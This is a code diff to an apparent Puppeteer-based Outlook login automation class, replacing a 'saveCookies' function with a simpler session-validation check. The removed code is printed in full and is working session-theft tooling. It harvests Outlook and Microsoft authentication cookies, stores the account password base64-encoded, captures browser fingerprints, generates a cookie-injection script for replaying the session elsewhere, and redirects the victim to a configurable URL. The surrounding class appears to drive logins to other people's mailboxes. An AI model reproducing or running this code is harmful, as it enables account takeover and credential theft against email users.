@@ -560,141 +560,62 @@ class OutlookLoginAutomation {
         }
     }
 
-    async saveCookies(email = 'unknown', password = null) {
+    async validateSession(email = 'unknown') {
         try {
-            console.log('💾 Starting enhanced session saving process...');
+            console.log('🔍 Validating session state (no persistent storage)...');
 
-            const allCookies = await this.page.cookies();
-            console.log(`📊 Total cookies retrieved: ${allCookies.length}`);
+            // Simply verify we're logged in by checking for Outlook mail interface
+            await this.page.waitForSelector('[role="listbox"], .ms-MessageBar', { timeout: 10000 });
+            
+            const currentUrl = this.page.url();
+            const isValidSession = currentUrl.includes('outlook.office.com') || 
+                                 currentUrl.includes('outlook.live.com') ||
+                                 currentUrl.includes('mail.office365.com');
 
-            // Filter and optimize cookies
-            const essentialCookieNames = new Set([
-                'SPSIDMIGRATED', 'MSFPC', 'MSPSID', 'MSPID', 'MSPCID', 'MSP_OFFLINE',
-                'MicrosoftApplicationsTelemetryDeviceId', 'O365_AppControlTelemetryConsent',
-                'OIDCToken', 'OAuthToken', 'OutlookSession', 'X-EXT-BCSKey', 'X-EXT-BackEndKey',
-                'X-EXT-UXState', 'X-EXT-ClientId', 'X-EXT-HostName', 'X-EXT-UserAgent',
-                'OutlookUserSession', 'OutlookWebSession', 'OutlookWebApp',
-                'WebSessionOverride', 'aadSessionId', 'aadAuthUrl', 'STSID',
-                'SessRememberMe', 'MS0', 'OfficeHome.FrontPage.LastTile'
-            ]);
-
-            const domains = new Set();
-            const uniqueCookies = [];
-
-            for (const cookie of allCookies) {
-                domains.add(cookie.domain);
-
-                if (essentialCookieNames.has(cookie.name) || 
-                    cookie.name.includes('auth') || 
-                    cookie.name.includes('session') || 
-                    cookie.name.includes('token') ||
-                    cookie.domain.includes('outlook') || 
-                    cookie.domain.includes('office') || 
-                    cookie.domain.includes('microsoft')) {
+            if (isValidSession) {
+                console.log(`✅ Session validation successful for: ${email}`);
+                
+                // Check if we can access inbox
+                try {
+                    const inboxElements = await this.page.$$('[role="listbox"] [role="option"]');
+                    console.log(`📧 Found ${inboxElements.length} emails in inbox - session fully active`);
                     
-                    cookie.secure = true;
-                    cookie.sameSite = 'None';
-                    uniqueCookies.push(cookie);
+                    return {
+                        success: true,
+                        email: email,
+                        url: currentUrl,
+                        hasInboxAccess: inboxElements.length > 0,
+                        timestamp: new Date().toISOString()
+                    };
+                } catch (inboxError) {
+                    console.warn('Inbox access check failed, but login appears successful');
+                    return {
+                        success: true,
+                        email: email,
+                        url: currentUrl,
+                        hasInboxAccess: false,
+                        timestamp: new Date().toISOString()
+                    };
                 }
+            } else {
+                console.log(`❌ Session validation failed - not at Outlook interface`);
+                return {
+                    success: false,
+                    email: email,
+                    url: currentUrl,
+                    error: 'Not authenticated to Outlook',
+                    timestamp: new Date().toISOString()
+                };
             }
-
-            console.log(`📦 Optimized to ${uniqueCookies.length} essential authentication cookies`);
-
-            // Create session data
-            const fs = require('fs');
-            const path = require('path');
-            const sessionDir = 'session_data';
-
-            if (!fs.existsSync(sessionDir)) {
-                fs.mkdirSync(sessionDir, { recursive: true });
-            }
-
-            const sessionId = Date.now();
-            const sessionTimestamp = new Date().toISOString();
-            const sessionEmail = email || 'unknown';
-            const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
-            const sessionFilePath = path.join(sessionDir, sessionFileName);
-
-            const sessionData = {
-                id: sessionId,
-                timestamp: sessionTimestamp,
-                email: sessionEmail,
-                password: password ? Buffer.from(password).toString('base64') : null,
-                totalCookies: uniqueCookies.length,
-                domains: Array.from(domains),
-                cookies: uniqueCookies,
-                userAgent: await this.page.evaluate(() => navigator.userAgent),
-                browserFingerprint: {
-                    viewport: await this.page.viewport(),
-                    timezone: await this.page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
-                    language: await this.page.evaluate(() => navigator.language)
-                }
-            };
-
-            fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
-            console.log(`💾 Session saved with ${uniqueCookies.length} cookies`);
-
-            // Create injection script
-            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
-            const sessionScriptContent = `
-// Session Cookie Injector - Auto-generated on ${sessionTimestamp}
-(function() {
-    console.log('🚀 Injecting ${uniqueCookies.length} cookies for session: ${sessionEmail}');
-    
-    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
-    let injected = 0;
-
-    cookies.forEach(cookie => {
-        try {
-            let cookieStr = cookie.name + '=' + cookie.value + ';';
-            cookieStr += 'domain=' + cookie.domain + ';';
-            cookieStr += 'path=' + cookie.path + ';';
-            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
-            if (cookie.secure) cookieStr += 'secure;';
-            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
-
-            document.cookie = cookieStr;
-            injected++;
-        } catch (e) {
-            console.warn('Failed to inject cookie:', cookie.name);
-        }
-    });
-
-    console.log('✅ Successfully injected ' + injected + ' cookies!');
-    
-    setTimeout(() => {
-        if (confirm('Injected ' + injected + ' cookies for ${sessionEmail}! Open Outlook now?')) {
-            window.open('https://outlook.office.com/mail/', '_blank');
-        }
-    }, 1000);
-})();`;
-
-            fs.writeFileSync(sessionInjectScript, sessionScriptContent);
-            console.log(`🔧 Injection script created: inject_session_${sessionId}.js`);
-
-            // Get configurable redirect URL
-            let redirectUrl = 'https://office.com';
-            try {
-                const response = await fetch('http://localhost:5000/api/internal/redirect-url');
-                const data = await response.json();
-                if (data.success && data.redirectUrl) {
-                    redirectUrl = data.redirectUrl;
-                }
-            } catch (error) {
-                console.warn('Could not fetch redirect config, using default:', error.message);
-            }
-
-            console.log(`🔄 Redirecting to ${redirectUrl}...`);
-            await this.page.goto(redirectUrl, {
-                waitUntil: 'networkidle2',
-                timeout: 30000
-            });
-
-            return sessionFilePath;
 
         } catch (error) {
-            console.error('❌ Error saving enhanced session:', error.message);
-            return null;
+            console.error('❌ Error validating session:', error.message);
+            return {
+                success: false,
+                email: email,
+                error: error.message,
+                timestamp: new Date().toISOString()
+            };
         }
     }
 
